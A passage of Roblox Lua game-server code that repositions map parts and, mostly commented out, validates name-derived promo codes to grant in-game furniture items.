	local sizes = {Vector3.new(31, 0.400000006, 320.430054),Vector3.new(31, 0.400000006, 252.430054),Vector3.new(31, 0.400000006, 252.830063),Vector3.new(31, 0.400000006, 252.630051),Vector3.new(31, 0.400000006, 252.550049),Vector3.new(33.929985, 0.400000006, 1156.41992),Vector3.new(32.3699341, 0.400000006, 1156.38),Vector3.new(33.9099884, 0.400000006, 1156.40002)}
	
	for i,cframe in ipairs(cframes) do --new streets
		local copy = streetTemplate:clone()
		copy.Size = sizes[i]
		copy.CFrame = cframe
		copy.Parent = workspace
	end
	
	
	workspace.BasePlate.Size = Vector3.new(539.910034, 3.80000019, 1235.32996)
	workspace.BasePlate.CFrame = CFrame.new(1.95498657, -1.90000045, -11.1350403, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	
	workspace.Beach1.Size = Vector3.new(1235.41992, 29.2000008, 131.589996)
	workspace.Beach1.CFrame = CFrame.new(-332.809235, -21.0747776, -11.0737906, -1.6619349e-06, -0.0475255251, -0.998869419, 2.88581941e-08, 0.998869717, -0.0475255251, 1, -9.32581017e-08, -1.89806599e-06)
	
	workspace.Beach2.Size = Vector3.new(1235.12, 21.2000008, 130.559982)
	workspace.Beach2.CFrame = CFrame.new(336.588715, -16.8628674, -11.2046242, -3.46919478e-06, 0.0442605168, 0.999019504, -3.64064647e-07, 0.999019802, -0.0442605354, -0.99999994, -4.80708707e-07, -3.21316475e-06)

	workspace.RockWall1.Size = Vector3.new(1235.19995, 3.20000005, 0.200000003)
	workspace.RockWall1.CFrame = CFrame.new(	271.869995, -1.85725284, -11.2219467, 7.72715225e-13, 2.5331974e-07, -0.999996126, -2.54970889e-08, 0.999992251, 5.58793545e-07, 0.999996126, 2.55002792e-08, -2.34479103e-13)
	
	workspace.RockWall2.Size = Vector3.new(1235.31995, 3.20000005, 0.200000003)
	workspace.RockWall2.CFrame = CFrame.new(-267.919983, -1.82738698, -11.1418304, 6.28830321e-13, -1.01700425e-06, -0.999998391, 9.27506463e-08, 0.999996901, -1.15856528e-06, 0.99999851, -9.27504331e-08, -4.40536496e-13)

	workspace.RockWall3.CFrame = CFrame.new(1.93664551, -1.82917428, 606.580017, -0.999999583, -1.06915843e-06, 2.35551099e-08, -1.10268593e-06, 0.999999225, -2.660272e-11, -2.35562858e-08, -2.64890332e-11, -0.999999642)
	
	
	
	for _,team in ipairs(game.Teams:GetChildren()) do
		team:Destroy()
	end

	
end








---Blink code validation

local characterValues = {
["a"] = 369745,
["b"] = 588435,
["c"] = 456895,
["b"] = 120145,
["d"] = 495195,
["e"] = 300437,
["f"] = 001017,
["g"] = 103257,
["h"] = 252307,
["i"] = 466397,
["j"] = 711441,
["k"] = 012521,
["l"] = 778641,
["m"] = 131261,
["n"] = 714471,
["o"] = 133199,
["p"] = 888109,
["q"] = 999259,
["r"] = 102439,
["s"] = 605399,
["t"] = 446554,
["u"] = 464324,
["v"] = 466194,
["w"] = 273324,
["x"] = 326444,
["y"] = 111118,
["z"] = 000888,
["0"] = 466812,
["1"] = 830012,
["2"] = 612817,
["3"] = 098745,
["4"] = 131313,
["5"] = 188963,
["6"] = 713154,
["7"] = 796315,
["8"] = 713153,
["9"] = 711715,
}

characterToDigit = {
	["D"] = "1",
	["E"] = "2",
	["V"] = "3",
	["Z"] = "4",
	["C"] = "5",
	["Y"] = "6",
	["X"] = "7",
	["A"] = "8",
	["W"] = "9",
	["B"] = "0",
	
}

--2585163
--ECACDYV  --Dued1

--3380501 --player1
--VVABCBD


--[[
--UPDATECHANGE
local PromoDataStore = (game.PlaceId ~= 0 and game:GetService("DataStoreService"):GetDataStore("Promo"))
local PromoStatsDataStore = (game.PlaceId ~= 0 and game:GetService("DataStoreService"):GetDataStore("PromoStats"))

local EndTick

]]

--[[
local characterValues = {
["a"] = 369745,
["b"] = 588435,
["c"] = 456895,
["b"] = 120145,
["d"] = 495195,
["e"] = 300437,
["f"] = 001017,
["g"] = 103257,
["h"] = 252307,
["i"] = 466397,
["j"] = 711441,
["k"] = 012521,
["l"] = 778641,
["m"] = 131261,
["n"] = 714471,
["o"] = 133199,
["p"] = 888109,
["q"] = 999259,
["r"] = 102439,
["s"] = 605399,
["t"] = 446554,
["u"] = 464324,
["v"] = 466194,
["w"] = 273324,
["x"] = 326444,
["y"] = 111118,
["z"] = 000888,
["0"] = 466812,
["1"] = 830012,
["2"] = 612817,
["3"] = 098745,
["4"] = 131313,
["5"] = 188963,
["6"] = 713154,
["7"] = 796315,
["8"] = 713153,
["9"] = 711715,
} local value = 0
	for k, v in string.gmatch(string.lower("billsayhowdy"), "%w") do
		if characterValues[k] then
			value = value + characterValues[k]
		end
	end print(value)

]]

--[[
	characterToDigit = {
	["D"] = "1",
	["E"] = "2",
	["V"] = "3",
	["Z"] = "4",
	["C"] = "5",
	["Y"] = "6",
	["X"] = "7",
	["A"] = "8",
	["W"] = "9",
	["B"] = "0",
	
}
local num = ""
	for k, v in string.gmatch(string.upper("billsayshowdy"), "%a") do
		if characterToDigit[k] then
			num = num .. characterToDigit[k]
		end
	end
	print(num)
]]
--[[
function Validate(player,code)

	
	local num = ""
	for k, v in string.gmatch(string.upper(code), "%a") do
		if characterToDigit[k] then
			num = num .. characterToDigit[k]
		end
	end
	
	
	
	local value = 0
	for k, v in string.gmatch(string.lower(player.Name), "%w") do
		if characterValues[k] then
			value = value + characterValues[k]
		end
	end
	
	
	
	local valid = (tonumber(num) == value)
	workspace.Main.ValidateCode:FireClient(player,valid)
	
	local playerData = Players[player]

	if valid and not playerData:GetInventoryItemById(676560376) and not playerData.House:GetFurnitureDataByName("Scarf Kid") then --if already owned
		
		Dialog:ShowMessage(player,"Success!","The items have been added to your inventory.")
		
		--give furniture
		playerData:IncrementItemQuantity(676560376,1)
		playerData:IncrementItemQuantity(677459420,1)
		playerData:IncrementItemQuantity(677578722,1)
		playerData:IncrementItemQuantity(677615092,3)
		
		PromoStatsDataStore:IncrementAsync("RedeemCount",1)
		
		playerData:SaveData()
		
	elseif valid then
		Dialog:ShowMessage(player,"","You have already redeemed your code.")

	end
end






if PromoDataStore then
	PromoDataStore:OnUpdate("PromoEndTick",function(endTick)
		EndTick = endTick
		if EndTick and EndTick ~= 0 and EndTick > os.time() then
			local hoursLeft = math.ceil((EndTick - os.time()) / 3600)
			workspace.Main.ShowPromo:FireAllClients(hoursLeft)
		end
	end)
end


local success = pcall(function()
	EndTick = PromoDataStore:GetAsync("PromoEndTick")
end)

function PlayerEntered(player)
	if EndTick and EndTick > os.time() then
		
		while not Players[player] or not Players[player].StartedPlaying do
			wait(1)
		end
		
		if Players[player]:GetInventoryItemById(676560376) or Players[player].House:GetFurnitureDataByName("Scarf Kid") then
			return
		end
		
		wait(12)
		
		local hoursLeft = math.ceil((EndTick - os.time()) / 3600)
		workspace.Main.ShowPromo:FireClient(player,hoursLeft)
	end
	
end


workspace.Main.Chatted.OnServerEvent:connect(function(speaker,msg)
	Validate(speaker,msg)
end)

workspace.Main.ValidateCode.OnServerEvent:connect(Validate)



for _,p in ipairs(game.Players:GetPlayers()) do PlayerEntered(p) end
game.Players.PlayerAdded:connect(PlayerEntered)

--game:GetService("DataStoreService"):GetDataStore("Promo"):SetAsync("PromoEndTick",1489067778)
--game:GetService("DataStoreService"):GetDataStore("PromoStats"):SetAsync("RedeemCount",0)
--print(game:GetService("DataStoreService"):GetDataStore("PromoStats"):SetAsync("RedeemCount",0))
--print(os.time()+3600*24)


]]
